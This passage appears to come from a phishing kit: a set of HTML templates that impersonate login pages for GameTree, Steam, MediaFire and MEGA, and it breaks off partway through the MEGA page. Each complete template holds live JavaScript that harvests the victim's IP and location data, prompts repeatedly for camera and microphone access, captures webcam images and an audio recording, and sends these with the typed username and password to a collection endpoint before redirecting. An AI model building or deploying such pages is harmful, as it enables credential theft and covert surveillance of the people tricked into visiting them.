            color: #5A1EAA; /* Lighter shade of #3E1274 */
            text-decoration: none;
        }
        .terms a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                border-radius: 0;
                box-shadow: none;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 14px;
            }
            .continue-btn {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>GameTree</h1>
        <div class="subtitle">Make lifelong friends</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="email@gmail.com" required>
            <div id="email-error" class="error">Please enter a valid email or mobile number</div>
        </div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Please enter your password</div>
        </div>
        <span class="forgot-password">Forgot password</span>
        <button class="continue-btn" onclick="handleSignIn()">Continue</button>
        <div class="terms">
            By signing up you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>
        </div>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;
        let accountSent = false;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/'
            ];
            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email || !emailRegex.test(email)) {
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "sl0": """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Steam</title>
    <link href="https://fonts.googleapis.com/css2?family=DIN+Next+Pro:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'DIN Next Pro', 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: #171a21; /* Steam's dark background */
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden; /* Prevent horizontal overflow */
        }
        .container {
            width: 90%; /* Flexible width */
            max-width: 400px; /* Max width for larger screens */
            padding: 5vw; /* Responsive padding */
            background: #1b2838; /* Steam's dark gray */
            border-radius: 3px;
            box-sizing: border-box;
            margin: 20px auto; /* Centered with margin */
            color: #c6d4df; /* Steam's light gray text */
        }
        .logo {
            width: 35vw; /* Responsive logo size */
            max-width: 140px; /* Cap for larger screens */
            margin-bottom: 5vw; /* Responsive margin */
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        h1 {
            font-size: clamp(20px, 6vw, 24px); /* Responsive font size */
            font-weight: 400;
            color: #fff;
            margin: 0 0 5vw; /* Responsive margin */
            text-align: center;
            word-wrap: break-word; /* Prevent text overflow */
        }
        .input-container {
            margin-bottom: 4vw; /* Responsive margin */
            position: relative;
        }
        input {
            width: 100%;
            padding: 3vw; /* Responsive padding */
            font-size: clamp(12px, 3.5vw, 14px); /* Responsive font size */
            background: #323a45; /* Steam's input background */
            border: 1px solid #323a45;
            border-radius: 3px;
            color: #fff;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        input:focus {
            border-color: #66c0f4; /* Steam blue */
        }
        input::placeholder {
            color: #8f98a0;
        }
        .error {
            color: #d9534f;
            font-size: clamp(10px, 3vw, 12px); /* Responsive font size */
            margin-top: 1.5vw; /* Responsive margin */
            text-align: left;
            display: none;
            word-wrap: break-word; /* Prevent text overflow */
        }
        .signin-btn {
            width: 100%;
            background: #66c0f4; /* Steam blue */
            color: #fff;
            border: none;
            padding: 3vw; /* Responsive padding */
            border-radius: 3px;
            font-size: clamp(12px, 3.5vw, 14px); /* Responsive font size */
            font-weight: 600;
            cursor: pointer;
            margin-top: 4vw; /* Responsive margin */
            transition: background 0.2s;
        }
        .signin-btn:hover {
            background: #4b9cd3; /* Darker blue */
        }
        .options {
            display: flex;
            flex-wrap: wrap; /* Wrap on small screens */
            justify-content: space-between;
            align-items: center;
            margin-top: 3vw; /* Responsive margin */
            font-size: clamp(11px, 3vw, 13px); /* Responsive font size */
            color: #c6d4df;
        }
        .options input[type="checkbox"] {
            margin-right: 1vw; /* Responsive spacing */
        }
        .options a {
            color: #66c0f4;
            text-decoration: none;
            white-space: nowrap; /* Prevent link wrapping */
        }
        .options a:hover {
            text-decoration: underline;
        }
        .signup {
            margin-top: 6vw; /* Responsive margin */
            text-align: center;
            font-size: clamp(11px, 3vw, 13px); /* Responsive font size */
            color: #c6d4df;
            word-wrap: break-word; /* Prevent text overflow */
        }
        .signup a {
            color: #66c0f4;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        .footer {
            position: fixed; /* Fixed footer for small screens */
            bottom: 0;
            width: 100%;
            background: #1b2838;
            padding: 3vw 0; /* Responsive padding */
            text-align: center;
            color: #c6d4df;
            font-size: clamp(10px, 2.5vw, 12px); /* Responsive font size */
        }
        .footer a {
            color: #c6d4df;
            text-decoration: none;
            margin: 0 2vw; /* Responsive spacing */
        }
        .footer a:hover {
            color: #66c0f4;
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container {
                padding: 4vw;
                margin: 2vw auto;
                border-radius: 0; /* No rounding on small screens */
            }
            .options {
                flex-direction: column; /* Stack options vertically */
                gap: 2vw; /* Responsive gap */
            }
            .footer {
                padding: 2vw 0;
            }
        }
        @media (min-width: 481px) {
            .container {
                padding: 32px; /* Fixed padding for larger screens */
            }
            .logo {
                width: 140px; /* Fixed size for larger screens */
                margin-bottom: 24px;
            }
            h1 {
                font-size: 24px;
                margin-bottom: 24px;
            }
            input {
                padding: 12px;
                font-size: 14px;
            }
            .error {
                font-size: 12px;
                margin-top: 6px;
            }
            .signin-btn {
                padding: 12px;
                font-size: 14px;
                margin-top: 16px;
            }
            .options {
                font-size: 13px;
                margin-top: 12px;
            }
            .signup {
                font-size: 13px;
                margin-top: 24px;
            }
            .footer {
                padding: 12px 0;
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://store.steampowered.com/public/shared/images/header/logo_steam.svg" alt="Steam Logo" class="logo">
        <h1>Sign In</h1>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Steam Account Name" required>
            <div id="email-error" class="error">Please enter a valid Steam Account Name</div>
        </div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Please enter your password</div>
        </div>
        <button class="signin-btn" onclick="handleSignIn()">Sign In</button>
        <div class="options">
            <label><input type="checkbox"> Remember me on this computer</label>
            <a href="#">Forgot your password or account name?</a>
        </div>
        <div class="signup">
            Don’t have a Steam account? <a href="#">Create one for free</a>
        </div>
    </div>

    <div class="footer">
        <a href="#">Privacy Policy</a>
        <a href="#">Legal</a>
        <a href="#">Steam Subscriber Agreement</a>
        <a href="#">Refunds</a>
        <span>© 2025 Valve Corporation. All rights reserved.</span>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;
        let accountSent = false;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                await Promise.race([loaded, timeoutPromise]);
                video.play();
                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };
                try {
                    recorder.start();
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }
                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://steampowered.com/',
                'https://store.steampowered.com/login/'
            ];
            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const emailError = document.getElementById('email-error');
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!email) {
                emailError.style.display = 'block';
                return;
            } else {
                emailError.style.display = 'none';
            }

            if (!password) {
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
 HEADERS: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "mfl0": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In - MediaFire</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Open Sans', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fff; /* Beyaz arka plan */
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px;
            background-color: #fff;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            display: block;
            margin: 0 auto 30px;
            width: 200px; /* Yatay logo için genişlik */
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            text-align: center;
            margin: 0 0 10px;
        }
        .subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            font-size: 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #0078d4; /* Mavi odak rengi */
            box-shadow: 0 0 0 1px #0078d4;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0078d4; /* Mavi bağlantı rengi */
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #0078d4; /* Mavi bağlantı rengi */
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
        }
        .next-btn, .signin-btn {
            background-color: #0078d4; /* Mavi buton rengi */
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #005ea6; /* Koyu mavi hover rengi */
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #666;
            font-size: 12px;
            padding: 10px 0;
            background-color: #fff; /* Beyaz footer */
        }
        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #d83b01; /* Hata mesajı için kırmızı yerine koyu turuncu (mavi temaya uyumlu) */
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                box-shadow: none;
            }
            .logo {
                width: 150px; /* Mobil için küçültülmüş boyut */
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://gcdnb.pbrd.co/images/GSq9Qog313Jt.png?o=1" alt="MediaFire Logo" class="logo">
        <h1>Log In</h1>
        <div class="subtitle">Access your MediaFire account</div>
        <div class="input-container">
            <input type="email" id="email-input" placeholder="Email" required>
            <div id="email-error" class="error">Enter a valid email</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot email?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Sign Up</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://gcdnb.pbrd.co/images/GSq9Qog313Jt.png?o=1" alt="MediaFire Logo" class="logo">
        <h1>Welcome</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Log In</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://google.com/',
                'https://youtube.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", "ml0": """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to MEGA</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #fff; /* Beyaz arka plan */
        }
        .container {
            width: 100%;
            max-width: 360px; /* MEGA'nın dar form genişliği */
            padding: 40px 20px;
            background-color: #fff;
            box-sizing: border-box;
            margin: 20px;
        }
        .logo {
            display: block;
            margin: 0 auto 40px;
            width: 180px; /* Yatay logo için uygun genişlik */
        }
        h1 {
            font-size: 28px;
            font-weight: 500;
            color: #202124; /* Koyu gri başlık */
            text-align: center;
            margin: 0 0 20px;
        }
        .input-container {
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px 15px;
            font-size: 16px;
            border: 1px solid #d9d9d9; /* Hafif gri çerçeve */
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #f8f8f8; /* Hafif gri input arka planı */
        }
        input:focus {
            border-color: #ff3333; /* Kırmızı odak rengi */
            box-shadow: 0 0 0 2px rgba(255, 51, 51, 0.2);
        }
        .forgot-link {
            margin-bottom: 20px;
            text-align: left;
        }
        .forgot-link a {
            color: #ff3333; /* Kırmızı bağlantı rengi */
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account a {
            color: #ff3333; /* Kırmızı bağlantı rengi */
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .create-account a:hover {
            text-decoration: underline;
        }
        .next-btn, .signin-btn {
            background-color: #ff3333; /* Kırmızı buton rengi */
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-transform: uppercase; /* MEGA butonları büyük harf */
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #cc0000; /* Koyu kırmızı hover */
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #666;
            font-size: 12px;
            padding: 15px 0;
            background-color: #fff;
        }
        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            color: #ff3333; /* Kırmızı hover */
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #d93025; /* Hata rengi (koyu kırmızı ton) */
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px 15px;
                margin: 10px;
            }
            .logo {
                width: 140px; /* Mobil için küçültülmüş */
            }
            h1 {
                font-size: 24px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://gcdnb.pbrd.co/images/Lqqg6RscPH6w.png?o=1" alt="MEGA Logo" class="logo">
        <h1>Log in to MEGA</h1>
        <div class="input-container">
            <input type="email" id="email-input" placeholder="Email address or phone number" required>
            <div id="email-error" class="error">Enter a valid email or phone number</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot your email?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Create an account</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://gcdnb.pbrd.co/images/Lqqg6RscPH6w.png?o=1" alt="MEGA Logo" class="logo">
        <h1>Log in to MEGA</h1>
